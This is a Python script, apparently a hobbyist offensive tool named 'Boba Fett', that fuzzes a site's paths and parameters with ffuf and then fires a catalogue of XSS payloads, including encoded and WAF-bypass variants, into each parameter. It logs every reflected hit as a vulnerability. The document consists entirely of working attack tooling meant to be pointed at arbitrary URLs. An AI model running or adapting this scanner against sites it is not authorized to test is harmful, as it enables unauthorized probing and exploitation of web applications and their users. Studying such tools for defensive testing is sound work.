#!/usr/bin/env python3

import asyncio
import aiohttp
import random
import string
import json
import time
import hashlib
import urllib.parse
import subprocess
import os
import re
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import sys

# Cores
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    END = '\033[0m'

def print_colored(text, color=Colors.WHITE, end='\n'):
    print(f"{color}{text}{Colors.END}", end=end)

# =========================
# HELP
# =========================
def show_help():
    help_text = f"""
{Colors.CYAN}{Colors.BOLD}USAGE:{Colors.END}
  python3 boba_fett.py [MODE] [OPTIONS]

{Colors.CYAN}{Colors.BOLD}MODES:{Colors.END}
  --discover, -d     Discovery mode: find potential XSS targets using ffuf
  --xss              XSS scan mode (default if no mode specified)
  --full             Run discovery + XSS scan automatically

{Colors.CYAN}{Colors.BOLD}OPTIONS FOR DISCOVERY MODE:{Colors.END}
  -u <url>           Base URL (e.g., http://site.com)
  -w <wordlist>      Wordlist for paths (default: common.txt)
  -p <param_file>    Parameter wordlist (default: params.txt)
  -o <output>        Output file for discovered URLs (default: targets.txt)
  -t <threads>       Threads for ffuf (default: 30)

{Colors.CYAN}{Colors.BOLD}OPTIONS FOR XSS MODE:{Colors.END}
  -t <url>           Single target URL (e.g., http://site.com/page.php?id=1)
  -tf <file>         File with list of targets (one per line)
  -a, --aggressive   Use aggressive payload set (more vectors)
  -v, --verbose      Show detailed scan output

{Colors.CYAN}{Colors.BOLD}EXAMPLES:{Colors.END}
  # Discover parameters on a site
  python3 boba_fett.py -d -u http://www.site.com -w common.txt -p params.txt

  # Discover and then scan XSS
  python3 boba_fett.py --full -u http://www.site.com -a

  # XSS scan on discovered targets
  python3 boba_fett.py --xss -tf targets.txt -a -v

  # Single target XSS scan
  python3 boba_fett.py -t "http://site.com/page.php?id=1" -a
"""
    print(help_text)
    sys.exit(0)

# =========================
# CLI PARSING
# =========================
if "-h" in sys.argv or "--help" in sys.argv:
    show_help()

# Modos
DISCOVER_MODE = "--discover" in sys.argv or "-d" in sys.argv
XSS_MODE = "--xss" in sys.argv
FULL_MODE = "--full" in sys.argv

# Flags comuns
AGGRESSIVE_MODE = "--aggressive" in sys.argv or "-a" in sys.argv
VERBOSE_MODE = "-v" in sys.argv or "--verbose" in sys.argv

# Se nenhum modo especificado, assume XSS mode (compatibilidade)
if not (DISCOVER_MODE or XSS_MODE or FULL_MODE):
    XSS_MODE = True

# =========================
# PARÂMETROS PARA DESCOBERTA
# =========================
BASE_URL = None
PATH_WORDLIST = "/wordlist/common.txt"  # wordlist de caminhos (ex: /admin, /cat.php)
PARAM_WORDLIST = "/wordlist/params.txt"  # wordlist de parâmetros (ex: id, q, page)
OUTPUT_TARGETS = "targets.txt"
FFUF_THREADS = 30

if DISCOVER_MODE or FULL_MODE:
    if "-u" in sys.argv:
        try:
            BASE_URL = sys.argv[sys.argv.index("-u") + 1]
        except:
            print_colored("[ERROR] -u requires a URL", Colors.RED)
            sys.exit(1)
    else:
        print_colored("[ERROR] Discovery mode requires -u <base_url>", Colors.RED)
        sys.exit(1)
    
    if "-w" in sys.argv:
        PATH_WORDLIST = sys.argv[sys.argv.index("-w") + 1]
    if "-p" in sys.argv:
        PARAM_WORDLIST = sys.argv[sys.argv.index("-p") + 1]
    if "-o" in sys.argv:
        OUTPUT_TARGETS = sys.argv[sys.argv.index("-o") + 1]
    if "-t" in sys.argv and sys.argv[sys.argv.index("-t") + 1].isdigit():
        FFUF_THREADS = int(sys.argv[sys.argv.index("-t") + 1])

# =========================
# PARÂMETROS PARA XSS
# =========================
TARGET_URL = None
TARGET_FILE = None

if XSS_MODE or FULL_MODE:
    if "-t" in sys.argv:
        try:
            TARGET_URL = sys.argv[sys.argv.index("-t") + 1]
        except:
            print_colored("[ERROR] -t requires a URL", Colors.RED)
            sys.exit(1)
    if "-tf" in sys.argv:
        try:
            TARGET_FILE = sys.argv[sys.argv.index("-tf") + 1]
        except:
            print_colored("[ERROR] -tf requires a file", Colors.RED)
            sys.exit(1)

# =========================
# BANNER
# =========================
def banner():
    print_colored(r"""
    ____        __                ______     __  __ 
   / __ )____  / /_  ____ _      / ____/__  / /_/ /_
  / __  / __ \/ __ \/ __ `/_____/ /_  / _ \/ __/ __/
 / /_/ / /_/ / /_/ / /_/ /_____/ __/ /  __/ /_/ /_  
/_____/\____/_.___/\__,_/     /_/    \___/\__/\__/   XSS-hunting
          
Made by @GsHell0ST
    """, Colors.CYAN + Colors.BOLD)

def log(msg, color=Colors.WHITE):
    now = datetime.now().strftime("%H:%M:%S")
    print_colored(f"[{now}] {msg}", color)

# =========================
# FUNÇÕES DE DESCOBERTA (FFUF)
# =========================
def check_ffuf():
    """Verifica se ffuf está instalado"""
    if subprocess.run(["which", "ffuf"], capture_output=True).returncode != 0:
        log("[ERROR] ffuf not found. Install with: sudo apt install ffuf", Colors.RED)
        return False
    return True

def discover_paths(base_url, wordlist, threads=30):
    """Descobre paths usando ffuf (ex: /cat.php, /index.php)"""
    log(f"[DISCOVER] Fuzzing paths using wordlist: {wordlist}", Colors.CYAN)
    
    # Remove trailing slash
    base = base_url.rstrip('/')
    cmd = [
        "ffuf", "-u", f"{base}/FUZZ", "-w", wordlist,
        "-c", "-t", str(threads), "-s", "-fc", "404,403"
    ]
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        paths = []
        for line in result.stdout.splitlines():
            # ffuf output lines contain status codes and URLs
            if "|" in line and "http" in line:
                parts = line.split('|')
                if len(parts) >= 2:
                    url_part = parts[1].strip()
                    if url_part.startswith("http"):
                        paths.append(url_part)
        log(f"[DISCOVER] Found {len(paths)} paths", Colors.GREEN)
        return paths
    except Exception as e:
        log(f"[ERROR] ffuf path discovery failed: {e}", Colors.RED)
        return []

def discover_parameters_on_url(url, param_wordlist, threads=30):
    """Descobre parâmetros em uma URL usando ffuf (ex: ?FUZZ=test)"""
    # Remove any existing query string
    parsed = urlparse(url)
    base_url = urlunparse(parsed._replace(query=""))
    
    # Fuzz parameter names
    cmd = [
        "ffuf", "-u", f"{base_url}?FUZZ=test", "-w", param_wordlist,
        "-c", "-t", str(threads), "-s", "-mr", "test"  # match if "test" appears in response
    ]
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        params = []
        for line in result.stdout.splitlines():
            if "|" in line and "FUZZ" not in line:
                parts = line.split('|')
                if len(parts) >= 2:
                    param = parts[0].strip()
                    if param and param not in params:
                        params.append(param)
        return params
    except Exception as e:
        log(f"[ERROR] ffuf param discovery on {url} failed: {e}", Colors.RED)
        return []

async def discover_targets():
    """Função principal de descoberta"""
    if not check_ffuf():
        return
    
    log(f"[DISCOVER] Starting discovery on {BASE_URL}", Colors.CYAN + Colors.BOLD)
    
    # Verificar se as wordlists existem
    if not os.path.exists(PARAM_WORDLIST):
        log(f"[WARN] Parameter wordlist '{PARAM_WORDLIST}' not found. Creating default.", Colors.YELLOW)
        with open(PARAM_WORDLIST, "w") as f:
            defaults = ["id", "q", "s", "search", "page", "cat", "product", "user", "name", "email"]
            f.write("\n".join(defaults))
    
    all_targets = []
    
    # 1. Descobrir paths
    paths = discover_paths(BASE_URL, PATH_WORDLIST, FFUF_THREADS)
    if not paths:
        # Se não encontrou paths, usa a própria base URL
        paths = [BASE_URL]
    
    # 2. Para cada path, descobrir parâmetros
    for path in paths:
        log(f"[DISCOVER] Testing parameters on: {path}", Colors.BLUE)
        params = discover_parameters_on_url(path, PARAM_WORDLIST, FFUF_THREADS)
        if params:
            for param in params:
                # Construir URL com parâmetro (valor dummy)
                parsed = urlparse(path)
                if parsed.query:
                    new_query = f"{parsed.query}&{param}=xss_test"
                else:
                    new_query = f"{param}=xss_test"
                target_url = urlunparse(parsed._replace(query=new_query))
                all_targets.append(target_url)
                log(f"[FOUND] {target_url}", Colors.GREEN)
    
    # 3. Salvar resultados
    with open(OUTPUT_TARGETS, "w") as f:
        for target in all_targets:
            f.write(target + "\n")
    
    log(f"[DISCOVER] Discovery complete. Found {len(all_targets)} potential targets.", Colors.GREEN + Colors.BOLD)
    log(f"[DISCOVER] Saved to: {OUTPUT_TARGETS}", Colors.CYAN)
    
    return all_targets

# =========================
# FUNÇÕES DO SCANNER XSS (ORIGINAL)
# =========================
def gen_token():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=6))

def get_payloads(token):
    payloads = [
        ("[BASIC 1/4] Script tag", f"<script>alert('{token}')</script>"),
        ("[BASIC 2/4] IMG onerror", f"<img src=x onerror=alert('{token}')>"),
        ("[BASIC 3/4] Body onload", f"<body onload=alert('{token}')>"),
        ("[BASIC 4/4] SVG onload", f"<svg onload=alert('{token}')>"),
        ("[EVENT 1/5] Mouse over", f"<div onmouseover=alert('{token}')>X</div>"),
        ("[EVENT 2/5] On click", f"<button onclick=alert('{token}')>X</button>"),
        ("[EVENT 3/5] On focus", f"<input onfocus=alert('{token}') autofocus>"),
        ("[EVENT 4/5] On input", f"<input oninput=alert('{token}')>"),
        ("[EVENT 5/5] On error", f"<img src=x onerror=alert('{token}')>"),
        ("[JS 1/4] JavaScript URI", f"javascript:alert('{token}')"),
        ("[JS 2/4] String injection", f"';alert('{token}');//"),
        ("[JS 3/4] Double quote", f'\";alert(\"{token}\");//'),
        ("[JS 4/4] Eval", f"<script>eval('alert(\"{token}\")')</script>"),
        ("[IFRAME 1/2] Iframe", f"<iframe src=javascript:alert('{token}')>"),
        ("[IFRAME 2/2] Iframe srcdoc", f"<iframe srcdoc='<script>alert(\"{token}\")</script>'>"),
        ("[ATTR 1/2] Double quote", f'" onmouseover=alert("{token}") x="'),
        ("[ATTR 2/2] Single quote", f"' onmouseover=alert('{token}') x='"),
        ("[DOM 1/2] Document write", f"<script>document.write('<img src=x onerror=alert(\"{token}\")>')</script>"),
        ("[DOM 2/2] InnerHTML", f"<script>document.body.innerHTML='<img src=x onerror=alert(\"{token}\")>'</script>"),
        ("[ADV 1/3] SetTimeout", f"<script>setTimeout(\"alert('{token}')\",0)</script>"),
        ("[ADV 2/3] AngularJS", f"{{{{alert('{token}')}}}}"),
        ("[ADV 3/3] Template", f"${{alert('{token}')}}"),
    ]
    
    if AGGRESSIVE_MODE:
        extra = [
            ("[MEDIA 1/4] Video", f"<video><source onerror='alert(\"{token}\")'></video>"),
            ("[MEDIA 2/4] Audio", f"<audio src=x onerror='alert(\"{token}\")'></audio>"),
            ("[MEDIA 3/4] Canvas", f"<canvas onload='alert(\"{token}\")'></canvas>"),
            ("[MEDIA 4/4] Object", f"<object data=javascript:alert('{token}')>"),
            ("[META 1/2] Meta refresh", f"<meta http-equiv='refresh' content='0;javascript:alert(\"{token}\")'>"),
            ("[META 2/2] Meta link", f"<link rel=import href='data:text/html,<script>alert(\"{token}\")</script>'>"),
            ("[DIALOG 1/2] Confirm", f"<script>confirm('{token}')</script>"),
            ("[DIALOG 2/2] Prompt", f"<script>prompt('{token}')</script>"),
            ("[ENCODED] URL Encoded", urllib.parse.quote(f"<script>alert('{token}')</script>")),
            ("[ENCODED] Double URL", urllib.parse.quote(urllib.parse.quote(f"<script>alert('{token}')</script>"))),
            ("[WAF BYPASS] Case variation", f"<ScRiPt>alert('{token}')</ScRiPt>"),
            ("[WAF BYPASS] No quotes", f"<script>alert({token})</script>"),
        ]
        payloads.extend(extra)
    
    return payloads

async def fetch(session, url):
    try:
        async with session.get(url, timeout=5, ssl=False) as resp:
            return await resp.text()
    except:
        return ""

def analyze_response(response, token, payload):
    if token in response:
        lines = response.split('\n')
        for line in lines:
            if token in line:
                context = ""
                if "<script>" in line.lower():
                    context = "dentro de tag script"
                elif "onerror=" in line.lower() or "onload=" in line.lower():
                    context = "em evento HTML"
                elif "value=" in line.lower() or 'href=' in line.lower():
                    context = "em atributo HTML"
                elif "alert" in line.lower():
                    context = "em código JavaScript"
                elif token in line and "<" not in line:
                    context = "em texto plano"
                else:
                    context = "em resposta HTML"
                snippet = line.strip()[:150]
                return True, context, snippet
    return False, "", ""

async def scan_url(url):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    if not params:
        log(f"[ERROR] URL sem parâmetros: {url}", Colors.RED)
        return 0
    
    print_colored("\n" + "="*80, Colors.CYAN)
    log(f"Target: {url}", Colors.CYAN + Colors.BOLD)
    log(f"Parameters: {', '.join(params.keys())}", Colors.CYAN)
    log(f"Mode: {'AGGRESSIVE' if AGGRESSIVE_MODE else 'NORMAL'}", Colors.CYAN)
    print_colored("="*80 + "\n", Colors.CYAN)
    
    total_found = 0
    
    async with aiohttp.ClientSession() as session:
        for param in params.keys():
            print_colored(f"\n[*] Testing parameter: {param}", Colors.MAGENTA + Colors.BOLD)
            payloads = get_payloads(gen_token())
            param_found = False
            
            for i, (payload_name, payload_template) in enumerate(payloads, 1):
                token = gen_token()
                payload = payload_template.replace('{token}', token)
                if token not in payload and f"'{token}'" not in payload:
                    payload = payload_template.replace("alert('')", f"alert('{token}')")
                    if token not in payload:
                        payload = payload_template + f" // {token}"
                
                temp_params = params.copy()
                temp_params[param] = payload
                new_query = urlencode(temp_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=new_query))
                
                progress = f"[{i:2d}/{len(payloads):2d}]"
                print_colored(f"  {progress} Testing: {payload_name:<30} ", Colors.BLUE, end='')
                
                resp = await fetch(session, test_url)
                if not resp:
                    print_colored("❌ No response", Colors.RED)
                    continue
                
                is_vuln, context, snippet = analyze_response(resp, token, payload)
                if is_vuln:
                    total_found += 1
                    param_found = True
                    print_colored("✅ VULNERABLE!", Colors.GREEN + Colors.BOLD)
                    print_colored(f"       Parameter: {param}", Colors.GREEN)
                    print_colored(f"       Payload: {payload_name}", Colors.GREEN)
                    print_colored(f"       Context: {context}", Colors.YELLOW)
                    print_colored(f"       Code: {payload[:100]}", Colors.CYAN)
                    print_colored(f"       Reflection: {snippet}", Colors.DIM)
                    
                    with open("xss_found.txt", "a") as f:
                        f.write(f"\n{'='*60}\n")
                        f.write(f"XSS Found: {datetime.now()}\n")
                        f.write(f"URL: {test_url}\n")
                        f.write(f"Parameter: {param}\n")
                        f.write(f"Payload Type: {payload_name}\n")
                        f.write(f"Payload: {payload}\n")
                        f.write(f"Context: {context}\n")
                        f.write(f"{'='*60}\n")
                    break
                else:
                    print_colored("❌ Not vulnerable", Colors.DIM)
                
                await asyncio.sleep(0.05)
            
            if param_found:
                print_colored(f"\n[✓] Parameter '{param}' is VULNERABLE! 🎯", Colors.GREEN + Colors.BOLD)
            else:
                print_colored(f"\n[✗] Parameter '{param}' seems safe", Colors.YELLOW)
    
    return total_found

async def scan_targets_from_file(filename):
    """Lê arquivo e escaneia cada URL"""
    try:
        with open(filename, "r") as f:
            urls = [line.strip() for line in f if line.strip()]
    except Exception as e:
        log(f"[ERROR] Cannot read {filename}: {e}", Colors.RED)
        return 0
    
    total_vulns = 0
    for i, url in enumerate(urls, 1):
        log(f"\n[SCAN] Progress: {i}/{len(urls)} - {url}", Colors.CYAN + Colors.BOLD)
        vulns = await scan_url(url)
        total_vulns += vulns
        await asyncio.sleep(1)  # delay between targets
    
    return total_vulns

# =========================
# MAIN
# =========================
async def main():
    banner()
    
    if FULL_MODE:
        log("[MODE] Full mode: discovery + XSS scan", Colors.GREEN + Colors.BOLD)
        # Run discovery
        await discover_targets()
        # Then run XSS on generated file
        if os.path.exists(OUTPUT_TARGETS):
            log("[FULL] Starting XSS scan on discovered targets...", Colors.CYAN)
            await scan_targets_from_file(OUTPUT_TARGETS)
        else:
            log("[ERROR] No targets discovered. Exiting.", Colors.RED)
    
    elif DISCOVER_MODE:
        log("[MODE] Discovery mode", Colors.GREEN + Colors.BOLD)
        await discover_targets()
    
    elif XSS_MODE:
        log("[MODE] XSS scan mode", Colors.GREEN + Colors.BOLD)
        if TARGET_URL:
            await scan_url(TARGET_URL)
        elif TARGET_FILE:
            await scan_targets_from_file(TARGET_FILE)
        else:
            log("[ERROR] XSS mode requires -t <url> or -tf <file>", Colors.RED)
            show_help()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print_colored("\n\n[!] Interrupted by user", Colors.YELLOW + Colors.BOLD)
